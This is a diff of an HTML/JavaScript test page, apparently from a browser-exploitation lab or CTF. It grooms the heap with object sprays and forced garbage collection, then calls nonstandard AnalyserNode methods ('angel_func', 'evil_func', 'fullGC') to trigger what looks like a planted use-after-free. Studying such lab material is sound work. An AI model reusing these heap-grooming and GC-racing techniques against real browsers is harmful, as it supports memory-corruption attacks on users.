@@ -1,7 +1,3 @@
-<head>
-<script src="test_proto.js"></script>
-</head>
-    
 <body>
 <iframe id="frame" src=""></iframe>
 <br>
@@ -9,13 +5,13 @@
 <button onclick="alloc()">Alloc</button>
 <button onclick="gc()">gc</button>
 <button onclick="spray()">Spray</button>
+<button onclick="multiple_alloc()">Alloc multi</button>
 <script>
 var audioContext;
 var analyserNode;
 var barrier = [];
 var holes = [];
-
-var recovers = [];
+// var webworker = new Worker("prime.js");
 function spray() {
     for (let i = 0; i < 248; ++i) {
 	barrier.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
@@ -24,7 +20,7 @@ function spray() {
     let tmp1 = [];
     for (let j = 0; j < 4; ++j) {
 	let tmp_arr = [];
-	for (let i = 0; i < 27; ++i)
+	for (let i = 0; i < 26; ++i)
 	    tmp1.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 	for (let i = 0; i < 224; ++i) {
 	    tmp_arr.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
@@ -35,39 +31,63 @@ function spray() {
     for (let i = 0; i < tmp1.length; ++i)
 	tmp1[i] = undefined;
     gc();
-    /*
-    let tmp2 = [];
-    for (let i = 0; i < 26; ++i)
-	tmp2.push({f: "f", g: "g", h: "h", i: "i", j: "j"});
-    recovers.push(tmp2);
-    */
-
     query();
 }
 
 var new_objs = [];
 function alloc() {
     let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
-    new_objs.push(tmp)
+    new_objs.push(tmp);
     analyserNode.angel_func(tmp);
 }
 
+function multiple_alloc() {
+    // webworker.postMessage("start");
+    /*
+    setTimeout(function() {
+	for (let i = 0; i < 4; ++i) {
+	    let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+	    new_objs.push(tmp);
+	    analyserNode.angel_func(tmp);
+	    query();
+	}
+    }, 1000);
+    */
+    var id = setInterval(analyserNode.fullGC, 0);
+    /*
+    (function myLoop(i) {
+	setTimeout(function() {
+	    let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+	    new_objs.push(tmp);
+	    analyserNode.angel_func(tmp);
+	    if (--i) myLoop(i);
+	}, 10000);
+    })(4);
+    */
+    for (let i = 0; i < 4; ++i) {
+	let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+	// gc();
+	new_objs.push(tmp);
+	analyserNode.angel_func(tmp);
+    }
+    // webworker.postMessage("stop");
+    clearInterval(id);
+}
+
 function gc() {
-    for (let i = 0; i < 0x50; i++) { new ArrayBuffer(0x1000000); }
+    for (let i = 0; i < 0x40; i++) { new ArrayBuffer(0x1000000); }
 }
 
 function query() {
     analyserNode.evil_func();
 }
 
-window.addEventListener("message", (event) => {
-    worker = window.frames[0].document.getElementById("worker");
-}, false);
 try {
     audioContext = new AudioContext();
 } catch(e) {
     alert('Web Audio API is not supported in this browser');
 }
+
 analyserNode = audioContext.createAnalyser();
 
 </script>
